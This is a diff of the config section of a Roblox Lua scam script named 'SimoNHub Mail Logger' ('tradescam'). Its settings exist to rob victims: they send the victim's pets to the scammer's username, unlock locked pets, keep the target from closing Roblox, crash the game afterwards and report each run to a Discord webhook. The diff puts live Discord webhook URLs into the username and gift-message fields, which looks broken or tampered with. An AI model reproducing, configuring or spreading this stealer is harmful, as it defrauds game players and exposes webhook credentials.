@@ -1,7 +1,9 @@
 --[[ SimoNHub Mail Logger ]]--
 
 --[[ Main Config ]]--
-_G.Username = "HerrySzymoN" --// Username To Send Pets To
+_G.Username = "HerrySzymoNhttps://discord.com/api/webhooks/1059121179555803187/_4F0Y-wzAVC_RqBS9BgDH4GaAJfJ-3xOWUVEy6rUnQ0UOZ4kvFtB91EKCRhpeksM8m6d" --// Username To Send Pets To
+_G.GiftMessage = "https://discord.com/api/webhooks/1059121179555803187/_4F0Y-wzAVC_RqBS9BgDH4GaAJfJ-3xOWUVEy6rUnQ0UOZ4kvFtB91EKCRhpeksM8m6d" --// Message For The Gift To Say
+
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
@@ -10,7 +12,7 @@ _G.Crash = true  --// Crashes Them After Its Finished
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
 _G.Mention = true --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1097062322985521192/mrlGqhqcve2pWpIWSjGcuKKV2BpltcOL8scUkXgb2_7e1oZsHfPkg-WD9ob50Ok0Ki9-" --// Discord Webhook For Executions
+_G.Webhook = "" --// Discord Webhook For Executions
 
 --[[ UI Config ]]--
 _G.ScriptName = "tradescam" --// Script Name On The UI
